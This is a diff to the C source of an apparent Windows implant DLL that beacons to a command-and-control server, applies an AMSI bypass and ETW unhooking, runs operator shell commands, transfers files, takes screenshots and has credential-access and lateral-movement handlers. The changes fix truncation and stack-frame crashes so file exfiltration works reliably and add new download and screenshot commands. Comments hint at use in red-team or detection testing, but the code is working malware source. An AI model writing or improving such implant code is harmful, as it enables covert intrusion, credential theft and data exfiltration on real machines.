@@ -507,7 +507,7 @@ static void px_vocab_init(void)
     px_strcpy(g_vocab.env_c2_port, "PX_C2_PORT", sizeof(g_vocab.env_c2_port));
     px_strcpy(g_vocab.env_trace, "PX_TRACE", sizeof(g_vocab.env_trace));
     px_strcpy(g_vocab.f_hello, "HELLO|%s|%lu|%s", sizeof(g_vocab.f_hello));
-    px_strcpy(g_vocab.f_caps, "CAPS|%lu", sizeof(g_vocab.f_caps));
+    px_strcpy(g_vocab.f_caps, "CAPS|%lx", sizeof(g_vocab.f_caps));
     px_strcpy(g_vocab.f_result, "RESULT|%s|%s|%ld", sizeof(g_vocab.f_result));
     px_strcpy(g_vocab.f_exec, "EXEC %s : %s\n", sizeof(g_vocab.f_exec));
     px_strcpy(g_vocab.f_marker,
@@ -535,7 +535,7 @@ static void px_vocab_init(void)
     px_strcpy(g_vocab.log_amsi_ok, "[px] AMSI bypass applied\n",
               sizeof(g_vocab.log_amsi_ok));
     px_strcpy(g_vocab.log_amsi_fail,
-              g_vocab.log_amsi_fail,
+              "[px] AMSI bypass failed\n",
               sizeof(g_vocab.log_amsi_fail));
     px_strcpy(g_vocab.log_etw_ok, "[px] ETW unhooked\n", sizeof(g_vocab.log_etw_ok));
     px_strcpy(g_vocab.log_etw_fail, "[px] ETW unhook failed\n",
@@ -580,6 +580,13 @@ static void px_vocab_init(void)
               sizeof(g_vocab.log_backoff));
     px_strcpy(g_vocab.log_reconnect, "[px] session ended, reconnecting\n",
               sizeof(g_vocab.log_reconnect));
+    px_strcpy(g_vocab.log_transfer, "[px] transfer %s : %s\n",
+              sizeof(g_vocab.log_transfer));
+    px_strcpy(g_vocab.log_cap, "[px] capability %s : %s\n",
+              sizeof(g_vocab.log_cap));
+    px_strcpy(g_vocab.download, "DL|", sizeof(g_vocab.download));
+    px_strcpy(g_vocab.screenshot, "SHOT|", sizeof(g_vocab.screenshot));
+    px_strcpy(g_vocab.cap_cmd, "CAP|", sizeof(g_vocab.cap_cmd));
 #endif
 }
 
@@ -840,7 +847,19 @@ static px_size_t px_vfmt_va(char *out, px_size_t cap, const char *fmt,
             px_size_t len = 0;
             if (!s)
                 s = "(null)";
-            while (s[len] && len < 1024)
+            /* The scan is bounded by the OUTPUT capacity, not by a fixed
+             * number.
+             *
+             * A fixed limit was a silent corruption: the file transfer
+             * puts a base64 chunk -- tens of kilobytes -- through %s, and
+             * a 1024-character limit truncated it. The chunk went out
+             * short, the server reassembled a file that was not the file
+             * that was sent, and the hashes did not match. Nothing said
+             * the string was too long; it just came out wrong.
+             *
+             * The output cannot be longer than the buffer, so scanning
+             * past the buffer's capacity is pointless anyway. */
+            while (s[len] && len < cap)
                 len++;
             {
                 /* The padding is only ever positive. Computing it as
@@ -1044,7 +1063,7 @@ unsigned int px_snprintf(char *out, unsigned int cap, const char *fmt, ...)
 
 static void px_logf(const char *fmt, ...)
 {
-    char buf[2048];
+    static char buf[2048];
     px_va_list ap;
     px_size_t n;
     PX_VA_START(ap, fmt);
@@ -1114,9 +1133,33 @@ static char *b64_encode(const unsigned char *in, px_size_t len)
  *
  * Rather than reimplement a compiler intrinsic in assembly, the build
  * raises the stack-probe threshold with /Gs so that the compiler never
- * emits the call in the first place. The largest frame in this file is
- * about 5KB (wbuf[2048] plus wcmd[3072] plus the rest), well inside the
- * 1MB default stack, so probing is not needed here.
+ * emits the call in the first place.
+ *
+ * THAT HAS A CONSEQUENCE, AND IT IS NOT AN OBVIOUS ONE.
+ *
+ *     The Windows stack grows ONE PAGE PER FAULT, and the kernel refuses
+ *     to grow it when the faulting address is more than one page below
+ *     the stack pointer. So with the probe disabled, every stack frame
+ *     in this payload has to fit inside one page.
+ *
+ *     A frame larger than a page does not use more stack. It KILLS the
+ *     process, at the first call made inside it: the call pushes a
+ *     return address below the guard page, and the kernel refuses to
+ *     grow the stack that far.
+ *
+ *     This was not theoretical. The file-transfer path had a 64KB frame
+ *     for the chunk line, and the payload died with an access violation
+ *     the moment it called the encoder. The compile was clean, the
+ *     logic was right, and the file transfer simply never worked in any
+ *     arm that was not obfuscated.
+ *
+ *     So: every buffer of 1024 bytes or more in this payload lives in
+ *     static storage, not on the stack. The payload is single-threaded,
+ *     so nothing is lost, and the frames stay small.
+ *
+ *     A C-implemented __chkstk was tried first and does not work: on
+ *     x64 the compiler passes the size in r10, not in the register the
+ *     C calling convention would use, so the stub reads garbage.
  *
  * MinGW needs none of this: GCC does not reference __chkstk.
  */
@@ -1157,7 +1200,15 @@ static int send_line(PX_SOCKET s, const char *line, int len, fn_send p_send)
 {
 #if PX_ENCRYPT
     if (px_ks_active()) {
-        unsigned char frame[2048];
+        /* The frame buffer is large enough for the biggest line the
+         * protocol produces.
+         *
+         * A file transfer sends a base64 chunk of tens of kilobytes in
+         * one line, and a frame buffer that cannot hold it would make
+         * the transfer fail in the encrypted arm only -- which is the
+         * kind of difference between arms that nobody notices until
+         * somebody tries it. */
+        static unsigned char frame[PX_MAX_LINE + 8];
         unsigned int flen = px_ks_encrypt(line, (unsigned int)len, frame,
                                           (unsigned int)sizeof(frame));
         if (flen == 0) {
@@ -1171,14 +1222,16 @@ static int send_line(PX_SOCKET s, const char *line, int len, fn_send p_send)
     }
 #endif
     {
-        char out[2048];
-        int n = len;
-        if (n + 2 > (int)sizeof(out))
-            n = (int)sizeof(out) - 2;
-        memcpy(out, line, (size_t)n);
-        out[n] = '\r';
-        out[n + 1] = '\n';
-        return send_all(s, out, n + 2, p_send);
+        /* The line and its terminator are sent as two writes.
+         *
+         * The earlier version copied them into one 2KB buffer, which
+         * meant every line longer than 2KB was silently truncated on
+         * the wire. A file transfer's chunk line is tens of kilobytes,
+         * so the transfer arrived short and the server's hash did not
+         * match the file that was sent -- with no error anywhere. */
+        if (send_all(s, line, len, p_send) != 0)
+            return -1;
+        return send_all(s, "\r\n", 2, p_send);
     }
 }
 
@@ -1223,8 +1276,8 @@ static char *run_command(const char *cmd, long *exit_code)
     HANDLE rd, wr;
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
-    wchar_t wbuf[2048];
-    wchar_t wcmd[3072];
+    static wchar_t wbuf[2048];
+    static wchar_t wcmd[3072];
     char *buf;
     px_size_t cap = 32768, len = 0;
     int wlen;
@@ -1374,9 +1427,9 @@ static int px_handle_cap_cmd(PX_SOCKET sock, fn_send p_send,
     char *rest;
     char *p1;
     char *p2;
-    char report[2048];
+    static char report[2048];
     char *b64;
-    static char reply[65536];
+    static char reply[PX_MAX_LINE];
     px_size_t rn;
     int numeric;
 
@@ -1484,7 +1537,7 @@ static int px_handle_transfer_cmd(PX_SOCKET sock, fn_send p_send,
     char report[256];
     long rc = -1;
     char *b64;
-    static char reply[65536];
+    static char reply[PX_MAX_LINE];
     px_size_t rn;
 
     *handled = 0;
@@ -1546,7 +1599,7 @@ __declspec(dllexport) void px_entry(void)
 {
     PX_SOCKET sock;
     PX_SOCKADDR_IN addr;
-    static char recvbuf[16384];
+    static char recvbuf[PX_MAX_LINE + 16];
     px_size_t used = 0;
     char host[256];
     DWORD hn = sizeof(host);
@@ -1788,7 +1841,7 @@ connect_again:
 
     GetComputerNameA(host, &hn);
     {
-        char line[1024];
+        static char line[1024];
         px_size_t n = px_fmt(line, sizeof(line), g_vocab.f_hello,
                              is64 ? "x64" : "x86",
                              (unsigned long)GetCurrentProcessId(), host);
@@ -1834,7 +1887,7 @@ connect_again:
             unsigned int plainlen;
             unsigned int got = 0;
             unsigned char *frame;
-            char plain[2048];
+            static char plain[PX_MAX_LINE + 1];
             unsigned int plen;
 
             while (got < 4) {
@@ -1901,7 +1954,7 @@ connect_again:
                     char *cmd;
                     long rc = -1;
                     char *out, *b64;
-                    static char reply[65536];
+                    static char reply[PX_MAX_LINE];
 
                     bar1 = px_strchr(cmd_id, '|');
                     if (!bar1)
@@ -1928,10 +1981,10 @@ connect_again:
                         HeapFree(GetProcessHeap(), 0, out);
                 } else if (px_strncmp(plain, g_vocab.cred, 5) == 0) {
                     char *cmd_id = plain + 5;
-                    char report[1024];
+                    static char report[1024];
                     long rc = -1;
                     char *b64;
-                    static char reply[65536];
+                    static char reply[PX_MAX_LINE];
                     int supported = PX_CRED_ACCESS ? 1 : 0;
 
                     bar1 = px_strchr(cmd_id, '|');
@@ -1963,10 +2016,10 @@ connect_again:
                 else if (px_strncmp(plain, g_vocab.lateral, 8) == 0) {
                     char *cmd_id = plain + 8;
                     char *host;
-                    char report[1024];
+                    static char report[1024];
                     long rc = -1;
                     char *b64;
-                    static char reply[65536];
+                    static char reply[PX_MAX_LINE];
 
                     bar1 = px_strchr(cmd_id, '|');
                     if (!bar1)
@@ -2045,7 +2098,7 @@ connect_again:
                 char *cmd;
                 long rc = -1;
                 char *out, *b64;
-                static char reply[65536];
+                static char reply[PX_MAX_LINE];
 
                 bar1 = px_strchr(cmd_id, '|');
                 if (!bar1)
@@ -2079,10 +2132,10 @@ connect_again:
                  * defender can see that the capability is absent, not
                  * just that nothing happened. */
                 char *cmd_id = recvbuf + 5;
-                char report[1024];
+                static char report[1024];
                 long rc = -1;
                 char *b64;
-                static char reply[65536];
+                static char reply[PX_MAX_LINE];
                 int supported = PX_CRED_ACCESS ? 1 : 0;
 
                 bar1 = px_strchr(cmd_id, '|');
@@ -2120,10 +2173,10 @@ connect_again:
                  * propagation. The operator supplies the host. */
                 char *cmd_id = recvbuf + 8;
                 char *host;
-                char report[1024];
+                static char report[1024];
                 long rc = -1;
                 char *b64;
-                static char reply[65536];
+                static char reply[PX_MAX_LINE];
 
                 bar1 = px_strchr(cmd_id, '|');
                 if (!bar1)
